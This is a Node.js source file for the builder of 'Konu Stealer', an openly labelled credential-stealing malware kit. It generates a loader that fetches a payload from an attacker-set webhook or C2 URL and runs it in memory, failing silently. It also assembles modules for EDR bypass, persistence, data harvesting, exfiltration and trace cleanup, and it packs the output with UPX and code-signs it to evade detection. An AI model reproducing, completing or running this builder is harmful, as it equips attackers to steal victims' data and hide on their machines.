const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ─── BUILD CONFIGURATION ──────────────────────────────────────────────────────
class BuildConfig {
  constructor(options = {}) {
    this.os = options.os || process.platform;
    this.arch = options.arch || os.arch();
    this.modules = options.modules || [];
    this.webhook = options.webhook || '';
    this.filename = options.filename || 'stealer.exe';
    this.obfuscate = options.obfuscate !== false;
    this.pack = options.pack || false;
    this.sign = options.sign || false;
    this.customPayload = options.customPayload || null;
  }
}

// ─── STUB GENERATOR ───────────────────────────────────────────────────────────
function generateStub(config) {
  const stub = `
// Konu Stealer — Multi-stage Loader
// Generated: ${new Date().toISOString()}
// Build ID: ${require('crypto').randomBytes(8).toString('hex')}

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const os = require('os');

// ─── STAGE 1: Download payload ──────────────────────────────────────────────
function downloadPayload(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    lib.get(url, (res) => {
      const data = [];
      res.on('data', chunk => data.push(chunk));
      res.on('end', () => resolve(Buffer.concat(data)));
    }).on('error', reject);
  });
}

// ─── STAGE 2: Execute in memory ─────────────────────────────────────────────
async function executeInMemory(payload) {
  const vm = require('vm');
  const code = payload.toString('utf8');
  vm.runInNewContext(code, {
    require: require,
    process: process,
    console: console,
    Buffer: Buffer
  });
}

// ─── STAGE 3: Main execution ────────────────────────────────────────────────
async function main() {
  const c2Url = '${config.webhook || 'https://api.github.com'}';
  try {
    const payload = await downloadPayload(c2Url);
    await executeInMemory(payload);
  } catch (e) {
    // Silent fail
  }
}

main();
`;
  return stub;
}

// ─── PAYLOAD COMPILER ────────────────────────────────────────────────────────
async function compilePayload(config) {
  const modules = [];
  
  // Load base modules
  if (config.modules.includes('edr-bypass')) {
    modules.push("const edrBypass = require('./edr-bypass');");
  }
  if (config.modules.includes('persistence')) {
    modules.push("const persistence = require('./persistence');");
  }
  if (config.modules.includes('advanced-collection')) {
    modules.push("const advancedCollection = require('./advanced-collection');");
  }
  if (config.modules.includes('secure-comms')) {
    modules.push("const secureComms = require('./secure-comms');");
  }
  if (config.modules.includes('cleanup')) {
    modules.push("const cleanup = require('./cleanup');");
  }

  const mainScript = `
// Konu Stealer — Main Execution
(async () => {
  try {
    ${modules.join('\n    ')}
    
    if (edrBypass) await edrBypass.checkAndBypass();
    if (persistence) await persistence.install();
    const data = advancedCollection ? await advancedCollection.harvest() : {};
    if (secureComms) await secureComms.exfiltrate(data, '${config.webhook}');
    if (cleanup) await cleanup.traces();
  } catch (e) {}
})();
`;
  return mainScript;
}

// ─── PACKING WITH UPX ─────────────────────────────────────────────────────────
async function packWithUPX(outputPath) {
  try {
    const upxPath = 'C:\\Program Files\\UPX\\upx.exe';
    if (fs.existsSync(upxPath)) {
      execSync(`"${upxPath}" --brute "${outputPath}"`, { stdio: 'ignore' });
      return true;
    }
  } catch (_) { }
  return false;
}

// ─── CODE SIGNING (SIMULATION) ───────────────────────────────────────────────
async function signExecutable(exePath, certPath, password) {
  try {
    if (!fs.existsSync(certPath)) return false;
    const signtool = 'C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\signtool.exe';
    if (fs.existsSync(signtool)) {
      execSync(`"${signtool}" sign /f "${certPath}" /p "${password}" /t http://time.certum.pl "${exePath}"`, { stdio: 'ignore' });
      return true;
    }
  } catch (_) { }
  return false;
}

// ─── MAIN BUILD ───────────────────────────────────────────────────────────────
async function build(config) {
  try {
    // Create build directory
    const buildDir = path.join(os.tmpdir(), 'konu_build_' + Date.now());
    fs.mkdirSync(buildDir, { recursive: true });
    
    // Generate stub
    const stub = generateStub(config);
    const stubPath = path.join(buildDir, 'loader.js');
    fs.writeFileSync(stubPath, stub, 'utf8');
    
    // Compile payload
    const payload = await compilePayload(config);
    const payloadPath = path.join(buildDir, 'payload.js');
    fs.writeFileSync(payloadPath, payload, 'utf8');
    
    // Combine stub and payload
    const finalCode = stub + '\n' + payload;
    const finalPath = path.join(buildDir, config.filename);
    fs.writeFileSync(finalPath, finalCode, 'utf8');
    
    // Pack if requested
    if (config.pack) {
      await packWithUPX(finalPath);
    }
    
    // Sign if requested
    if (config.sign) {
      await signExecutable(finalPath, config.certPath, config.certPassword);
    }
    
    return {
      success: true,
      outputPath: finalPath,
      filename: config.filename,
      size: fs.statSync(finalPath).size,
      buildId: require('crypto').randomBytes(8).toString('hex')
    };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ─── EXPORTS ──────────────────────────────────────────────────────────────────
module.exports = {
  BuildConfig,
  generateStub,
  compilePayload,
  packWithUPX,
  signExecutable,
  build
};